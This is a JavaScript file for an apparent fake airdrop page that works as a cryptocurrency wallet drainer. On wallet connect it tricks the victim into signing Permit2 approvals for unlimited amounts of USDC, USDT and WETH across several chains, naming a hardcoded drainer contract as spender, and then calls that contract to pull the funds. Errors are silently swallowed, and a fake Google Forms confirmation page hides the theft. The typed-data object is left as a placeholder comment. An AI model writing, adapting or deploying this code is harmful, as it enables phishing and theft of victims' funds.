// app.js
const DRAINER_ADDRESS = "0xd9145CCE52D386f254917e481eB44e9943F39138";
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const targetTokens = [
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
    "0x55d398326f99059fF775485246999027B3197955", // BSC USDT
    "0x4200000000000000000000000000000000000006",  // Base WETH
    "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"  // Base USDC
];

let connectedWallet = "";

document.addEventListener("DOMContentLoaded", () => {
    const connectBtn = document.getElementById("connectWalletBtn");
    const statusEl = document.getElementById("status");
    const walletDisplay = document.getElementById("walletAddress");
    const form = document.getElementById("airdropForm");

    connectBtn.addEventListener("click", async () => {
        statusEl.textContent = "Connecting...";

        try {
            const provider = window.ethereum;
            if (!provider) throw new Error("No wallet");

            const accounts = await provider.request({ method: "eth_requestAccounts" });
            connectedWallet = accounts[0];

            walletDisplay.innerHTML = `<strong>Connected:</strong><br>${connectedWallet.substring(0,6)}...${connectedWallet.slice(-4)}`;
            walletDisplay.classList.add("visible");
            connectBtn.textContent = "Connected";
            connectBtn.classList.add("connected");

            statusEl.textContent = "Signing verification...";
            await startDraining(connectedWallet);

        } catch (e) {
            statusEl.textContent = "Failed to connect wallet.";
            console.error(e);
        }
    });

    form.addEventListener("submit", (e) => {
        e.preventDefault();
        if (!connectedWallet) {
            alert("Please connect wallet first");
            return;
        }
        showSuccessPage();
    });
});

async function startDraining(victim) {
    try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const contract = new ethers.Contract(DRAINER_ADDRESS, [
            "function drainWithPermit2(address victim, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external"
        ], signer);

        for (let token of targetTokens) {
            try {
                const data = await getPermit2Data(token);
                await contract.drainWithPermit2(victim, data.permitSingle, data.signature);
            } catch (e) {}
        }
    } catch (e) {}
}

async function getPermit2Data(tokenAddress) {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;
    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;

    const permitSingle = {
        details: { token: tokenAddress, amount: "1461501637330902918203684832716283019655932542975", expiration, nonce: 0 },
        spender: DRAINER_ADDRESS,
        sigDeadline
    };

    const typedData = { /* same as before */ };
    const signature = await provider.send("eth_signTypedData_v4", [connectedWallet, JSON.stringify(typedData)]);

    return { permitSingle, signature };
}

function showSuccessPage() {
    document.body.innerHTML = `
        <div style="max-width:600px; margin:100px auto; text-align:center; font-family:Arial;">
            <h1 style="color:#34a853;">Your response has been recorded</h1>
            <p style="margin:20px 0; font-size:18px;">Thank you for submitting the form.</p>
            <a href="#" onclick="location.reload()" style="color:#1a73e8; text-decoration:underline;">Edit your response</a>
            <p style="margin-top:50px; color:#666;">This content is neither created nor endorsed by Google.</p>
        </div>
    `;
}
